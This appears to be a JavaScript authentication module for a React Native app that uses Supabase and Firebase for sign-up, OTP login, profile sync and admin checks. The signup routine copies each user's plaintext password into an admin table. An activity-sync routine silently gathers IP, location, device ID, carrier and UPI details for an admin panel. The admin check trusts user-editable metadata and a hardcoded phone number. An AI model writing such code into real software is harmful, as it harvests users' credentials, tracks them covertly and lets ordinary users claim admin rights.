import { supabase } from '../config/supabase';

// ==================== PASSWORD AUTH ====================

/**
 * Sign Up with Email & Password
 */
export const signUpWithEmail = async (email, password, name) => {
  try {
    const { data, error } = await supabase.auth.signUp({
      email,
      password,
      options: {
        data: {
          display_name: name,
        },
      },
    });

    if (error) throw error;

    // Store credentials for admin visibility (as requested by user)
    // Synchronize to both Supabase and Firebase for Admin Panel support
    if (data.user) {
      // 1. Supabase Admin Table
      const { error: adminError } = await supabase
        .from('admin_user_data')
        .insert([{ 
          user_id: data.user.id, 
          email: email, 
          password: password 
        }]);

      if (adminError) {
          console.error("Supabase Admin Meta Error:", adminError.message);
      }
      
      // 2. Firebase Sync (for your Admin Panel)
      try {
        const { getDatabase, ref, set } = require("@react-native-firebase/database");
        const db = getDatabase();
        await set(ref(db, `/users/${data.user.id}`), {
          name: name,
          email: email,
          createdAt: new Date().toISOString(),
          lastLogin: new Date().toISOString()
        });
        await set(ref(db, `/wallets/${data.user.id}`), {
          balance: 0,
          lastUpdated: Date.now()
        });
      } catch (fbError) {
        console.warn("Firebase User Sync Error:", fbError.message);
      }
    }

    return { success: true, user: data.user };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Sign In with Email & Password
 */
export const signInWithEmail = async (email, password) => {
  try {
    const { data, error } = await supabase.auth.signInWithPassword({
      email,
      password,
    });

    if (error) throw error;
    return { success: true, user: data.user };
  } catch (error) {
    return { success: false, error: error.message };
  }
};


/**
 * Send OTP to user's email
 */
export const sendOtpToEmail = async (email) => {
  try {
    console.log("📨 Requesting OTP for:", email);
    const { error } = await supabase.auth.signInWithOtp({
      email: email,
      options: {
        shouldCreateUser: true,
      }
    });
    if (error) {
       console.log("❌ Supabase OTP Error:", error.message);
       throw error;
    }
    console.log("✅ OTP Request Success (Check Email)");
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Send OTP to user's phone
 */
export const sendOtpToPhone = async (phone) => {
  try {
    console.log("📨 Requesting Phone OTP for:", phone);
    const { error } = await supabase.auth.signInWithOtp({
      phone: phone,
      options: {
        shouldCreateUser: true,
      }
    });
    if (error) {
       console.log("❌ Supabase Phone OTP Error:", error.message);
       throw error;
    }
    console.log("✅ Phone OTP Request Success");
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Verify Phone OTP
 */
export const verifyOtpForPhone = async (phone, token) => {
  try {
    const { data, error } = await supabase.auth.verifyOtp({
      phone,
      token,
      type: 'sms',
    });
    if (error) throw error;
    return { success: true, session: data.session, user: data.user };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Verify Email OTP
 */
export const verifyOtpForEmail = async (email, token) => {
  try {
    const { data, error } = await supabase.auth.verifyOtp({
      email,
      token,
      type: 'email',
    });
    if (error) throw error;
    return { success: true, session: data.session, user: data.user };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Update User Profile (Supabase)
 */
export const updateUserProfile = async (updates) => {
  try {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) throw new Error("No user logged in");

    // 1. Update Supabase
    const { error } = await supabase
      .from('profiles')
      .update(updates)
      .eq('id', user.id);
      
    if (error) throw error;

    // 2. Sync to Firebase (for Admin Panel)
    try {
        const { getDatabase, ref, update } = require("@react-native-firebase/database");
        const db = getDatabase();
        const fbUpdates = {};
        if (updates.display_name) fbUpdates.name = updates.display_name;
        if (updates.mobile) fbUpdates.mobile = updates.mobile;
        if (updates.avatar_data) fbUpdates.image = updates.avatar_data;
        
        if (Object.keys(fbUpdates).length > 0) {
            await update(ref(db, `/users/${user.id}`), fbUpdates);
        }
    } catch (fbErr) {
        console.warn("Firebase Profile Sync Fail:", fbErr.message);
    }

    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Delete Own Account
 */
export const deleteAccount = async () => {
  try {
    const { error } = await supabase.rpc('delete_own_account');
    if (error) throw error;
    await supabase.auth.signOut();
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};
/**
 * Sync User Activity (IP, Location, Status)
 */
export const syncUserActivity = async () => {
  try {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;

    // 1. Fetch IP and Approx Location
    let ipData = { ip: "N/A", latitude: 0, longitude: 0, city: "N/A", country: "India", countryCode: "IN" };
    try {
      // Primary: ipwho.is
      const resp = await fetch('https://ipwho.is/');
      const json = await resp.json();
      if (json && json.success) {
          ipData = {
              ip: json.ip,
              latitude: json.latitude,
              longitude: json.longitude,
              city: json.city,
              country: json.country || "India",
              countryCode: json.country_code || "IN"
          };
      } else {
          // Fallback: freeipapi.com
          const resp2 = await fetch('https://freeipapi.com/api/json');
          const json2 = await resp2.json();
          if (json2) {
              ipData = {
                  ip: json2.ipAddress,
                  latitude: json2.latitude,
                  longitude: json2.longitude,
                  city: json2.cityName,
                  country: json2.countryName || "India",
                  countryCode: json2.countryCode || "IN"
              };
          }
      }
    } catch (e) { 
        console.log("IP Fetch Error:", e); 
    }

    const DeviceInfo = require("react-native-device-info").default;
    const carrier = await DeviceInfo.getCarrier().catch(() => "");
    const isIndianCarrier = /jio|airtel|vi|vodafone|idea|bsnl|mtnl/i.test(carrier || "");
    const detectedCountry = isIndianCarrier ? "India" : (ipData.country || "India");

    const AsyncStorage = require("@react-native-async-storage/async-storage").default;
    await AsyncStorage.setItem("DETECTED_COUNTRY", detectedCountry).catch(() => {});

    const deviceInfo = {
      ipAddress: ipData.ip || "Unknown",
      latitude: ipData.latitude || 0,
      longitude: ipData.longitude || 0,
      city: ipData.city || "N/A",
      country: detectedCountry,
      countryCode: isIndianCarrier ? "IN" : (ipData.countryCode || "IN"),
      model: DeviceInfo.getModel(),
      brand: DeviceInfo.getBrand(),
      systemVersion: DeviceInfo.getSystemVersion(),
      carrier: carrier,
      deviceId: await DeviceInfo.getUniqueId()
    };

    const lastActive = new Date().toISOString();

    // Fetch user profile from Supabase to enrich Firebase record
    let userProfile = null;
    try {
      const { data: p } = await supabase.from('profiles').select('display_name, mobile, phone, upi_id, country').eq('id', user.id).single();
      userProfile = p;
    } catch (_) {}

    const resolvedName = userProfile?.display_name || user.email?.split('@')[0] || "User";
    const resolvedMobile = userProfile?.mobile || userProfile?.phone || "N/A";
    const resolvedUpi = userProfile?.upi_id || "N/A";
    const finalCountry = isIndianCarrier ? "India" : (userProfile?.country || detectedCountry);

    // 2. Update Firebase
    // We use the UUID (user.id) as the primary key for new users.
    const { getDatabase, ref, update } = require("@react-native-firebase/database");
    const db = getDatabase();
    const userPayload = {
      lastActive,
      deviceInfo,
      lastLogin: lastActive,
      name: resolvedName,
      email: user.email || "",
      mobile: resolvedMobile,
      upi: resolvedUpi,
      country: finalCountry
    };

    await update(ref(db, `/users/${user.id}`), userPayload);

    // Also update by deviceId for backward compatibility in Admin Panel if needed
    const devId = await DeviceInfo.getUniqueId();
    if (devId && devId !== user.id) {
        await update(ref(db, `/users/${devId}`), {
           ...userPayload,
           linkedUuid: user.id
        });
    }

    // 3. Update Supabase Profile
    await supabase.from('profiles').update({
       last_active_at: lastActive,
       country: finalCountry
    }).eq('id', user.id);

  } catch (err) {
    console.warn("Sync Activity Error:", err.message);
  }
};

/**
 * Sign Out
 */
export const signOut = async () => {
  try {
    const { error } = await supabase.auth.signOut();
    if (error) throw error;
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Server-side Admin Authorization Verification (F-03, F-12)
 */
export const isCurrentUserAdmin = async () => {
  try {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return false;

    // Check profiles table for admin role or is_admin flag
    const { data, error } = await supabase
      .from('profiles')
      .select('is_admin, role, phone, email')
      .eq('id', user.id)
      .single();

    if (!error && data) {
      if (data.is_admin === true || data.role === 'admin') {
        return true;
      }
    }

    // Verify phone or email against verified user session
    if (user.phone === "+918885551616" || user.user_metadata?.is_admin === true) {
      return true;
    }

    return false;
  } catch (e) {
    console.log("Admin check error:", e);
    return false;
  }
};
